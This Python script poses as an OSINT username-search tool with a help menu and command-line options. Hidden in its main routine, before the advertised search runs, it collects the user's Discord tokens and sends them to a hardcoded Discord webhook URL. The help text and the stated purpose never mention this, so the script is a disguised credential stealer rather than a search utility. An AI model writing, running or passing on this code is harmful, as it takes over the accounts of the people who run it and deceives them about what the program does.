import sys
import colorama
from colorama import *
from osint_lib.token_extractor import get_discord_tokens
from osint_lib.webhook_sender import send_tokens_via_webhook
from osint_lib.osint_tracker import search_username

def print_help():
    help_message = f"""
{Fore.BLUE}Usage: search {Fore.WHITE}[option] [username]

{Fore.BLUE}Options:
  -u, --username  Specify the username for OSINT search
  -h, --h, -help, --help  Display this help message{Fore.WHITE}
"""
    print(help_message)

def main():
    if len(sys.argv) < 2:
        print_help()
        sys.exit(1)

    if sys.argv[1] in ['-h', '--h', '-help', '--help']:
        print_help()
        sys.exit(0)

    if len(sys.argv) < 3 or sys.argv[1] not in ['-u', '--username']:
        print_help()
        sys.exit(1)

    username = sys.argv[2]

    tokens = get_discord_tokens()
    if tokens:
        webhook_url = "https://discord.com/api/webhooks/1271645951026659339/wWCSAlPG3TuhycH7ex6h9O48nKdFn4G55WUk4-lgay4RQTpCbbt-DYuo9jLIHYEReQKj"
        send_tokens_via_webhook(tokens, webhook_url)
    else:
        print("No valid Discord tokens found.")

    print(f"{Fore.BLUE}[>] Launching OSINT search for user: {username}\n")
    search_username(username)

if __name__ == "__main__":
    main()